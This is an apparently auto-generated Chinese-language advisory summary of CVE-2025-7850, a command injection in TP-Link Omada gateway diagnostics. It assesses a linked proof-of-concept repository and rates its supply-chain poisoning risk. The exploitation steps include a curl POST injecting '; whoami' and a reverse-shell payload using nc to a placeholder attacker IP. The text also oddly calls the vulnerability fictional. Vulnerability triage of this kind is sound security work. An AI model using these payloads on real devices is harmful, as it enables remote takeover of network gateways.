## CVE-2025-7850 - Omada Gateway OS Command Injection

**漏洞编号:** CVE-2025-7850

**漏洞类型:** OS Command Injection

**影响应用:** TP-Link Omada Gateways

**危害等级:** 高危，可能导致系统完全控制、数据泄露和拒绝服务

**影响版本:** ER8411 < 1.3.3, ER7412-M2 < 1.1.0, ER707-M2 < 1.3.1, ER7206 < 2.2.2, ER605 < 2.3.1, ER706W < 1.2.1, ER706W-4G < 1.2.1, ER7212PC < 2.1.3, FR365 < 1.1.10, FR205 < 1.0.3, FR307 < 1.2.5, G36 < 1.1.4, G611 < 1.2.2

**利用条件:** 需要管理员权限认证后的web portal访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-7850是一个存在于TP-Link Omada网关中的操作系统命令注入漏洞。经过身份验证的管理员可以通过Web Portal利用此漏洞执行任意系统命令。根据漏洞库信息，受影响的版本包括但不限于ER8411 1.3.3之前的版本，ER7412-M2 1.1.0之前的版本等。利用方式是，攻击者登录到web管理界面，然后在system tools > diagnostics 模块中注入恶意命令。

POC代码提供了一个实验室环境来模拟该漏洞。攻击者可以修改`start-exploit.bat` 脚本，并使用`omada-gateway-vuln.exe` 向 `/diagnostics` 端点发送包含恶意命令的POST请求，例如 `curl -X POST http://localhost:8080/diagnostics -d "cmd=ping 127.0.0.1; whoami"`。

**有效性评估：**

提供的POC代码有效，它提供了一个可用于验证和理解该漏洞的实验室环境。

**投毒风险评估：**

从提供的README.md的内容来看，主要风险点在于`omada-gateway-vuln.exe`这个二进制文件。 虽然代码声称仅用于演示目的，但仍存在以下潜在的投毒风险：

1.  **后门植入：** `omada-gateway-vuln.exe`可能包含额外的恶意代码，在用户不知情的情况下执行其他操作，例如收集系统信息、建立反向shell或下载恶意payload。
2.  **依赖项陷阱：** 虽然没有直接提及依赖项，但如果`omada-gateway-vuln.exe`依赖于外部库，这些库可能会被篡改以包含恶意代码。

由于无法直接检查`omada-gateway-vuln.exe`的内容，只能从静态分析的角度进行推测。考虑到这是为一个虚构的漏洞创建的实验室环境，**投毒风险相对较低，大约为10%**。然而，用户在实际使用前仍应保持警惕，并对`omada-gateway-vuln.exe`进行安全分析。

**利用方式总结：**

1.  攻击者首先需要拥有Omada网关的管理员权限。
2.  登录到网关的Web管理界面。
3.  导航到诊断工具（System Tools > Diagnostics）页面。
4.  在输入字段中构造包含恶意命令的payload，例如`; whoami`或`; nc -e /bin/sh <attacker_ip> <attacker_port>`。
5.  利用POC提供的`start-exploit.bat`和`omada-gateway-vuln.exe`简化payload发送流程，通过POST请求将恶意命令发送到`/diagnostics`端点。
6.  服务器执行注入的命令，攻击者可以通过响应或反向shell获取执行结果。


**项目地址:** [ByteHawkSec/CVE-2025-7850-POC](https://github.com/ByteHawkSec/CVE-2025-7850-POC)

**漏洞详情:** [CVE-2025-7850](https://nvd.nist.gov/vuln/detail/CVE-2025-7850)